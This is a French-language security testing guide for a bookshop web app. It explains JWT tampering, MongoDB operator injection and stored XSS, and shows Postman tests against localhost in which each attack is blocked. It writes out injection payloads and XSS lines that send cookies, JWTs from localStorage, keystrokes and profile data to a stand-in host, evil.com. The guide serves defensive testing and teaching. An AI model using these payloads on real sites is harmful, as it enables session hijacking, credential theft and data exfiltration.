# Guide Detaille des Attaques de Securite - Biblio-Poche

Ce document explique en profondeur les mecanismes de chaque type d'attaque
et comment les tester sur l'application.

---

# 1. ATTAQUE JWT (JSON Web Token)

## 1.1 Qu'est-ce qu'un JWT ?

Un JWT est un jeton d'authentification compose de 3 parties separees par des points :

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3NThmYTEyMzQ1Njc4OTAiLCJyb2xlIjoidXNlciIsImlhdCI6MTcwMjU2NzAwMCwiZXhwIjoxNzAzMTcxODAwfQ.K8x9Dj3kL2mN5pQ7rS1tU3vW5xY7zA9bC0dE2fG4hI6
|___________________________|___________________________________________________________________|________________________________|
        HEADER (Base64)                              PAYLOAD (Base64)                                    SIGNATURE
```

### Partie 1 : HEADER
```json
{
  "alg": "HS256",    // Algorithme de signature (HMAC SHA-256)
  "typ": "JWT"       // Type de token
}
```

### Partie 2 : PAYLOAD (les donnees)
```json
{
  "id": "6758fa1234567890",   // ID de l'utilisateur dans MongoDB
  "role": "user",             // Role (user ou admin)
  "iat": 1702567000,          // Issued At (date de creation)
  "exp": 1703171800           // Expiration (7 jours apres)
}
```

### Partie 3 : SIGNATURE
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  JWT_SECRET    // La cle secrete du serveur
)
```

---

## 1.2 Ou trouver le token JWT ?

### Methode 1 : Lors de la connexion (Login)

Quand tu te connectes, le serveur renvoie le token :

```
POST http://localhost:5000/api/auth/login
Content-Type: application/json

{
    "email": "test@test.com",
    "password": "MonMotDePasse123!"
}
```

**Reponse du serveur :**
```json
{
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3NThmYTEyMzQ1Njc4OTAiLCJyb2xlIjoidXNlciIsImlhdCI6MTcwMjU2NzAwMCwiZXhwIjoxNzAzMTcxODAwfQ.K8x9Dj3kL2mN5pQ7rS1tU3vW5xY7zA9bC0dE2fG4hI6",
    "user": {
        "id": "6758fa1234567890",
        "username": "testuser",
        "email": "test@test.com",
        "role": "user"
    }
}
```

### Methode 2 : Lors de l'inscription (Register)

```
POST http://localhost:5000/api/auth/register
Content-Type: application/json

{
    "username": "nouveauuser",
    "email": "nouveau@test.com",
    "password": "MonMotDePasse123!"
}
```

Le serveur renvoie aussi un token dans la reponse.

### Methode 3 : Dans le navigateur (localStorage)

Si tu es connecte sur le frontend, ouvre les DevTools (F12) :
1. Onglet "Application" (Chrome) ou "Stockage" (Firefox)
2. localStorage
3. Cherche la cle "token"

### Methode 4 : Intercepter avec les DevTools

1. Ouvre les DevTools (F12)
2. Onglet "Network" (Reseau)
3. Connecte-toi sur le site
4. Cherche la requete "login"
5. Dans "Response", tu verras le token

---

## 1.3 Comment le token est utilise ?

Pour chaque requete protegee, le frontend envoie le token dans le header :

```
GET http://localhost:5000/api/orders/myorders
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

Le serveur :
1. Extrait le token du header
2. Verifie la signature avec JWT_SECRET
3. Decode le payload pour obtenir l'ID et le role
4. Autorise ou refuse l'acces

---

## 1.4 Les attaques possibles sur JWT

### ATTAQUE 1 : Absence de token

**Principe :** Acceder a une route protegee sans token.

**Test Postman :**
```
GET http://localhost:5000/api/orders/myorders
(Pas de header Authorization)
```

**Ce qui se passe dans le code (auth.js ligne 5-8) :**
```javascript
const authHeader = req.headers.authorization;
if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ message: 'Non autorisé, token manquant' });
}
```

**Resultat :** 401 Unauthorized - PROTEGE

---

### ATTAQUE 2 : Token forge (fabrique de toutes pieces)

**Principe :** Creer un faux token en esperant qu'il soit accepte.

**Test Postman :**
```
GET http://localhost:5000/api/orders/myorders
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.faux_signature_inventee
```

**Ce qui se passe dans le code (auth.js ligne 12) :**
```javascript
const decoded = jwt.verify(token, process.env.JWT_SECRET);
// jwt.verify() va :
// 1. Decoder le header et le payload
// 2. Recalculer la signature avec JWT_SECRET
// 3. Comparer avec la signature du token
// 4. Si different -> ERREUR !
```

**Pourquoi ca echoue :**
- L'attaquant ne connait pas JWT_SECRET
- La signature qu'il invente ne correspond pas
- `jwt.verify()` detecte la fraude

**Resultat :** 401 Unauthorized - PROTEGE

---

### ATTAQUE 3 : Token modifie (alteration du payload)

**Principe :** Prendre un vrai token, modifier le payload (ex: changer role "user" en "admin").

**Scenario :**
1. L'attaquant se connecte et recoit un token valide
2. Il decode le payload (c'est du Base64, pas chiffre!)
3. Il modifie "role": "user" -> "role": "admin"
4. Il re-encode en Base64
5. Il envoie le token modifie

**Comment decoder un JWT (sur https://jwt.io) :**
```
Token original:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEyMyIsInJvbGUiOiJ1c2VyIn0.signature_originale

Payload decode:
{ "id": "123", "role": "user" }

Payload modifie:
{ "id": "123", "role": "admin" }

Token modifie:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEyMyIsInJvbGUiOiJhZG1pbiJ9.signature_originale
```

**Test Postman :**
```
GET http://localhost:5000/api/admin/stats
Authorization: Bearer <token_avec_payload_modifie>
```

**Pourquoi ca echoue :**
- La signature est calculee sur header + payload + secret
- Si le payload change, la signature devient invalide
- `jwt.verify()` recalcule et detecte la modification

**Resultat :** 401 Unauthorized - PROTEGE

---

### ATTAQUE 4 : Token expire

**Principe :** Utiliser un ancien token dont la date d'expiration est passee.

**Dans le code (authRoutes.js ligne 22) :**
```javascript
const token = jwt.sign(
    { id: user._id, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: '7d' }  // Expire dans 7 jours
);
```

**Ce qui se passe :**
- `jwt.verify()` verifie le champ `exp` du payload
- Si `Date.now() > exp`, le token est rejete

**Resultat :** 401 Unauthorized - PROTEGE

---

### ATTAQUE 5 : Escalade de privileges (user -> admin)

**Principe :** Un utilisateur normal tente d'acceder aux routes admin.

**Test Postman :**
```
GET http://localhost:5000/api/admin/stats
Authorization: Bearer <token_utilisateur_normal>
```

**Ce qui se passe dans admin.js ligne 14 :**
```javascript
if (decoded.role !== 'admin') {
    return res.status(403).json({ message: 'Acces refuse. Droits administrateur requis.' });
}
```

**Resultat :** 403 Forbidden - PROTEGE

---

## 1.5 Resume de la protection JWT

```
                    REQUETE ENTRANTE
                          |
                          v
            +---------------------------+
            |  Header Authorization ?   |
            +---------------------------+
                    |           |
                   NON         OUI
                    |           |
                    v           v
              401 Unauthorized  |
                                v
            +---------------------------+
            |  Format "Bearer token" ?  |
            +---------------------------+
                    |           |
                   NON         OUI
                    |           |
                    v           v
              401 Unauthorized  |
                                v
            +---------------------------+
            |   jwt.verify(token) OK ?  |
            |   (signature valide?)     |
            +---------------------------+
                    |           |
                   NON         OUI
                    |           |
                    v           v
              401 Unauthorized  |
                                v
            +---------------------------+
            |   Token non expire ?      |
            +---------------------------+
                    |           |
                   NON         OUI
                    |           |
                    v           v
              401 Unauthorized  |
                                v
            +---------------------------+
            |   Role suffisant ?        |
            |   (admin si route admin)  |
            +---------------------------+
                    |           |
                   NON         OUI
                    |           |
                    v           v
              403 Forbidden    ACCES AUTORISE
```

---

# 2. ATTAQUE NoSQL INJECTION

## 2.1 Qu'est-ce que l'injection NoSQL ?

C'est une technique pour manipuler les requetes de base de donnees
en injectant des operateurs MongoDB au lieu de valeurs normales.

### Requete normale (attendue)
```javascript
// L'utilisateur envoie :
{ "email": "user@test.com", "password": "secret123" }

// Le serveur execute :
User.findOne({ email: "user@test.com" })
// Cherche UN utilisateur avec cet email exact
```

### Requete malveillante (injection)
```javascript
// L'attaquant envoie :
{ "email": { "$gt": "" }, "password": "nimportequoi" }

// Le serveur executerait :
User.findOne({ email: { "$gt": "" } })
// Cherche UN utilisateur ou email > "" (TOUS les utilisateurs!)
```

---

## 2.2 Les operateurs MongoDB exploites

| Operateur | Signification | Exemple |
|-----------|---------------|---------|
| `$gt` | Greater than (superieur) | `{ "$gt": "" }` = tout > "" |
| `$gte` | Greater than or equal | `{ "$gte": "" }` |
| `$lt` | Less than (inferieur) | `{ "$lt": "zzz" }` |
| `$ne` | Not equal (different) | `{ "$ne": "" }` = tout != "" |
| `$in` | Dans une liste | `{ "$in": ["a", "b"] }` |
| `$regex` | Expression reguliere | `{ "$regex": ".*" }` = tout |
| `$exists` | Champ existe | `{ "$exists": true }` |
| `$or` | Condition OU | voir ci-dessous |

---

## 2.3 Scenario d'attaque detaille

### Etape 1 : L'attaquant analyse le formulaire de login

Il voit que le frontend envoie :
```json
{ "email": "...", "password": "..." }
```

### Etape 2 : Il tente une injection

Au lieu d'une string, il envoie un objet MongoDB :

**Test Postman :**
```
POST http://localhost:5000/api/auth/login
Content-Type: application/json

{
    "email": { "$gt": "" },
    "password": "x"
}
```

### Etape 3 : Ce qui se passerait SANS protection

```javascript
// Code vulnerable (EXEMPLE - pas dans ton app)
const user = await User.findOne({ email: req.body.email });
// Devient :
const user = await User.findOne({ email: { "$gt": "" } });
// Retourne le PREMIER utilisateur de la base !

if (user && req.body.password === user.password) {
    // Si le mot de passe etait stocke en clair, DANGER !
}
```

### Etape 4 : Ce qui se passe AVEC protection (ton application)

```javascript
// authRoutes.js
const user = await User.findOne({ email: req.body.email });
// email: { "$gt": "" } est un OBJET
// Mongoose essaie de le convertir en String -> echec ou null

if (!user) return res.status(400).json({ message: 'Identifiants invalides' });

// MEME SI ca passait, la verification bcrypt echoue :
const isMatch = await user.comparePassword(password);
// comparePassword fait bcrypt.compare("x", hash_du_vrai_mdp)
// "x" ne correspond pas au hash -> false
```

---

## 2.4 Tests detailles avec Postman

### TEST 1 : Injection $gt (Greater Than)

```
POST http://localhost:5000/api/auth/login
Content-Type: application/json

{
    "email": { "$gt": "" },
    "password": "test"
}
```

**Explication :** `{ "$gt": "" }` signifie "toute valeur superieure a une chaine vide" = TOUS les emails.

**Resultat attendu :** `400 Bad Request - Identifiants invalides`

---

### TEST 2 : Injection $ne (Not Equal)

```
POST http://localhost:5000/api/auth/login
Content-Type: application/json

{
    "email": { "$ne": "inexistant@fake.com" },
    "password": { "$ne": "" }
}
```

**Explication :**
- Email different de "inexistant@fake.com" = presque tous
- Password different de "" = tous les mots de passe non vides

**Resultat attendu :** `400 Bad Request - Identifiants invalides`

---

### TEST 3 : Injection $regex

```
POST http://localhost:5000/api/auth/login
Content-Type: application/json

{
    "email": { "$regex": ".*", "$options": "i" },
    "password": "test"
}
```

**Explication :** `.*` est une regex qui matche TOUT.

**Resultat attendu :** `400 Bad Request - Identifiants invalides`

---

### TEST 4 : Injection $or (contournement)

```
POST http://localhost:5000/api/auth/login
Content-Type: application/json

{
    "email": "fake@fake.com",
    "password": "x",
    "$or": [
        { "email": { "$exists": true } }
    ]
}
```

**Explication :** Tente d'ajouter une condition $or au niveau racine.

**Resultat attendu :** `400 Bad Request` (Mongoose ignore les champs inconnus)

---

### TEST 5 : Login normal (verification que ca marche)

```
POST http://localhost:5000/api/auth/login
Content-Type: application/json

{
    "email": "ton.vrai@email.com",
    "password": "TonVraiMotDePasse123!"
}
```

**Resultat attendu :** `200 OK` avec token

---

## 2.5 Pourquoi l'application est protegee

### Protection 1 : Mongoose Schema Validation

```javascript
// User.js
const userSchema = new mongoose.Schema({
    email: { type: String, required: true }  // Type STRING !
});
```

Quand Mongoose recoit `{ "$gt": "" }` (un objet) pour un champ String :
- Il tente de convertir l'objet en string
- Resultat : `"[object Object]"` ou erreur
- Aucun email ne matche "[object Object]"

### Protection 2 : Hashage bcrypt

Meme si l'injection passait et retournait un utilisateur :

```javascript
const isMatch = await user.comparePassword(password);
// bcrypt.compare("x", "$2a$10$...hash...")
// Le hash ne correspond PAS -> false
```

L'attaquant devrait connaitre le VRAI mot de passe.

### Protection 3 : Pas de mot de passe en clair

Si les mots de passe etaient stockes en clair :
```javascript
// DANGEREUX (pas dans ton app)
if (password === user.password) // Pourrait etre bypass par injection
```

Avec bcrypt, c'est impossible :
```javascript
// SECURISE (ton app)
bcrypt.compare("tentative", hash) // Toujours false si mauvais mdp
```

---

## 2.6 Schema de protection NoSQL

```
        REQUETE: { email: { "$gt": "" }, password: "x" }
                              |
                              v
        +----------------------------------------+
        |  Mongoose recoit email: { "$gt": "" }  |
        |  Type attendu: String                  |
        +----------------------------------------+
                              |
                              v
        +----------------------------------------+
        |  Conversion Object -> String           |
        |  Resultat: "[object Object]" ou null   |
        +----------------------------------------+
                              |
                              v
        +----------------------------------------+
        |  User.findOne({ email: "[object...]"}) |
        |  Resultat: null (aucun user trouve)    |
        +----------------------------------------+
                              |
                              v
        +----------------------------------------+
        |  if (!user) return 400 "Invalide"      |
        +----------------------------------------+
                              |
                              v
                    ATTAQUE BLOQUEE !

        MEME SI un user etait trouve :
                              |
                              v
        +----------------------------------------+
        |  bcrypt.compare("x", user.password)    |
        |  "x" != hash du vrai mot de passe      |
        |  Resultat: false                       |
        +----------------------------------------+
                              |
                              v
                    ATTAQUE BLOQUEE !
```

---

# 3. ATTAQUE XSS (Cross-Site Scripting)

## 3.1 Qu'est-ce que le XSS ?

Le XSS permet a un attaquant d'injecter du code JavaScript malveillant
qui sera execute dans le navigateur des autres utilisateurs.

### Types de XSS

| Type | Description | Exemple |
|------|-------------|---------|
| **Stored XSS** | Code stocke en BDD, execute pour tous | Commentaire avec `<script>` |
| **Reflected XSS** | Code dans l'URL, execute immediatement | `?search=<script>` |
| **DOM XSS** | Code manipulant le DOM directement | `innerHTML = userInput` |

**Ton application est concernee par le Stored XSS** (livres, commentaires).

---

## 3.2 Comment fonctionne une attaque XSS ?

### Scenario d'attaque

1. **L'attaquant cree un livre avec du code malveillant :**
```json
{
    "title": "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
    "author": "Hacker",
    "price": 10,
    "category": "Test"
}
```

2. **Le livre est stocke en base de donnees**

3. **Un utilisateur visite la page du livre**

4. **Le navigateur recoit :**
```html
<h1><script>document.location='http://evil.com/steal?cookie='+document.cookie</script></h1>
```

5. **Le script s'execute et vole les cookies !**

---

## 3.3 Les vecteurs d'attaque XSS

### Vecteur 1 : Balise `<script>`
```html
<script>alert('XSS')</script>
<script>document.cookie</script>
<script src="http://evil.com/malware.js"></script>
```

### Vecteur 2 : Evenements JavaScript
```html
<img src="x" onerror="alert('XSS')">
<body onload="alert('XSS')">
<div onmouseover="alert('XSS')">Hover me</div>
<input onfocus="alert('XSS')" autofocus>
```

### Vecteur 3 : URLs JavaScript
```html
<a href="javascript:alert('XSS')">Click me</a>
<iframe src="javascript:alert('XSS')">
```

### Vecteur 4 : Balises dangereuses
```html
<iframe src="http://evil.com"></iframe>
<embed src="http://evil.com/flash.swf">
<object data="http://evil.com/malware.swf">
```

### Vecteur 5 : Injection CSS
```html
<div style="background:url('javascript:alert(1)')">
<style>body{background:url('http://evil.com/track.gif')}</style>
```

---

## 3.4 Ce que peut faire un attaquant avec XSS

| Action | Code malveillant |
|--------|------------------|
| Voler les cookies | `document.location='http://evil.com?c='+document.cookie` |
| Voler le token JWT | `fetch('http://evil.com?t='+localStorage.getItem('token'))` |
| Rediriger l'utilisateur | `window.location='http://phishing.com'` |
| Modifier la page | `document.body.innerHTML='<h1>Site pirate</h1>'` |
| Keylogger | `document.onkeypress=function(e){fetch('http://evil.com?k='+e.key)}` |
| Voler des donnees | `fetch('/api/users/profile').then(r=>r.json()).then(d=>fetch('http://evil.com',{method:'POST',body:JSON.stringify(d)}))` |

---

## 3.5 Tests detailles avec Postman

### TEST 1 : Injection `<script>` basique

```
POST http://localhost:5000/api/books
Content-Type: application/json

{
    "title": "<script>alert('XSS')</script>",
    "author": "Test",
    "price": 10,
    "category": "Test"
}
```

**Sans protection, le titre serait :**
```html
<script>alert('XSS')</script>
```

**Avec protection (xss()), le titre devient :**
```html
&lt;script&gt;alert('XSS')&lt;/script&gt;
```

Les caracteres `<` et `>` sont remplaces par leurs entites HTML.
Le navigateur affiche le texte au lieu d'executer le script.

---

### TEST 2 : Injection avec img onerror

```
POST http://localhost:5000/api/books
Content-Type: application/json

{
    "title": "<img src=x onerror=alert('XSS')>",
    "author": "Test",
    "price": 10,
    "category": "Test"
}
```

**Resultat avec protection :**
```html
<img src="x">
```

L'attribut `onerror` est completement supprime par la librairie xss.

---

### TEST 3 : Injection iframe

```
POST http://localhost:5000/api/books
Content-Type: application/json

{
    "title": "Livre normal",
    "author": "Auteur",
    "price": 15,
    "category": "Test",
    "description": "<iframe src='http://evil.com'></iframe>"
}
```

**Resultat avec protection :**
```html
&lt;iframe src='http://evil.com'&gt;&lt;/iframe&gt;
```

L'iframe est echappee et affichee comme texte.

---

### TEST 4 : Vol de cookies

```
POST http://localhost:5000/api/books
Content-Type: application/json

{
    "title": "<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>",
    "author": "Hacker",
    "price": 1,
    "category": "Hack"
}
```

**Resultat avec protection :**
```
&lt;script&gt;fetch('http://evil.com/steal?cookie='+document.cookie)&lt;/script&gt;
```

Le code est affiche comme texte, pas execute.

---

### TEST 5 : Verification du resultat

Apres avoir cree un livre avec XSS, recupere-le :

```
GET http://localhost:5000/api/books/<id_du_livre>
```

**Verifie que le contenu est echappe dans la reponse JSON.**

---

## 3.6 Comment fonctionne la protection

### Dans le code (bookRoutes.js)

```javascript
const xss = require('xss');  // Import de la librairie

router.post('/', async (req, res) => {
    // AVANT de stocker, on nettoie :
    const cleanTitle = xss(req.body.title);
    const cleanAuthor = xss(req.body.author);
    const cleanCategory = xss(req.body.category);
    const cleanDescription = xss(req.body.description);
    const cleanImage = xss(req.body.image);

    const book = new Book({
        title: cleanTitle,        // Donnees nettoyees
        author: cleanAuthor,
        price: req.body.price,    // Les nombres n'ont pas besoin
        category: cleanCategory,
        description: cleanDescription,
        image: cleanImage
    });
    // ...
});
```

### Ce que fait la fonction xss()

| Entree | Sortie |
|--------|--------|
| `<script>alert(1)</script>` | `&lt;script&gt;alert(1)&lt;/script&gt;` |
| `<img onerror=alert(1)>` | `<img>` (attribut supprime) |
| `<a href="javascript:...">` | `<a href>` (href dangereux supprime) |
| `<iframe src="...">` | `&lt;iframe src="..."&gt;` |
| `Texte normal` | `Texte normal` (inchange) |

### Dans le modele User (User.js)

```javascript
const escapeHtml = require('escape-html');

userSchema.pre('save', async function() {
    this.username = escapeHtml(this.username);  // Echappe le username
    this.email = escapeHtml(this.email);        // Echappe l'email
    // ...
});
```

---

## 3.7 Schema de protection XSS

```
     ENTREE UTILISATEUR
     "<script>alert('XSS')</script>"
                |
                v
     +------------------------+
     |    Fonction xss()      |
     +------------------------+
                |
     Transformations :
     < -> &lt;
     > -> &gt;
     " -> &quot;
     ' -> &#x27;
     Attributs dangereux supprimes
                |
                v
     +------------------------+
     |   Donnees nettoyees    |
     | "&lt;script&gt;..."   |
     +------------------------+
                |
                v
     +------------------------+
     |   Stockage en BDD      |
     +------------------------+
                |
                v
     +------------------------+
     |   Affichage navigateur |
     |   (texte, pas code)    |
     +------------------------+

     L'utilisateur voit :
     <script>alert('XSS')</script>
     (comme du texte, pas execute)
```

---

# 4. TABLEAU RECAPITULATIF DES TESTS

## Tests JWT

| # | Test | Methode | URL | Headers/Body | Resultat attendu |
|---|------|---------|-----|--------------|------------------|
| 1 | Sans token | GET | /api/orders/myorders | Aucun | 401 "Token manquant" |
| 2 | Token invente | GET | /api/orders/myorders | Bearer abc123 | 401 "Token invalide" |
| 3 | Token modifie | GET | /api/orders/myorders | Bearer <modifie> | 401 "Token invalide" |
| 4 | User sur admin | GET | /api/admin/stats | Bearer <user> | 403 "Acces refuse" |
| 5 | Token valide | GET | /api/orders/myorders | Bearer <valide> | 200 OK |

## Tests NoSQL Injection

| # | Test | Payload email | Resultat attendu |
|---|------|---------------|------------------|
| 1 | $gt | `{ "$gt": "" }` | 400 "Invalide" |
| 2 | $ne | `{ "$ne": "" }` | 400 "Invalide" |
| 3 | $regex | `{ "$regex": ".*" }` | 400 "Invalide" |
| 4 | $exists | `{ "$exists": true }` | 400 "Invalide" |
| 5 | Normal | `"vrai@email.com"` | 200 OK (si mdp correct) |

## Tests XSS

| # | Test | Payload title | Resultat stocke |
|---|------|---------------|-----------------|
| 1 | Script | `<script>alert(1)</script>` | `&lt;script&gt;...` |
| 2 | Img onerror | `<img onerror=alert(1)>` | `<img>` |
| 3 | Iframe | `<iframe src=...>` | `&lt;iframe...&gt;` |
| 4 | Event | `<div onclick=...>` | `<div>` |
| 5 | Normal | `Mon livre` | `Mon livre` |

---

# 5. OUTILS POUR LES TESTS

## Postman

1. Telecharger : https://www.postman.com/downloads/
2. Creer une collection "Biblio-Poche Security Tests"
3. Ajouter chaque requete de test
4. Creer une variable d'environnement `{{token}}` pour le JWT

## JWT.io

Site web pour decoder/encoder les JWT :
https://jwt.io

1. Colle ton token
2. Vois le header et payload decodes
3. Modifie le payload pour tester

## DevTools Navigateur

1. F12 pour ouvrir
2. Onglet Network pour voir les requetes
3. Onglet Application > localStorage pour voir le token
4. Onglet Console pour tester du JavaScript

## Script de test automatique

```bash
cd backend
node security-tests/scan.js
```

---

# 6. CONCLUSION

L'application Biblio-Poche est protegee contre :

1. **JWT** : Verification de signature, expiration, roles
2. **NoSQL Injection** : Mongoose type casting + bcrypt
3. **XSS** : Sanitization avec xss() et escapeHtml()

Ces protections suivent les recommandations OWASP Top 10.
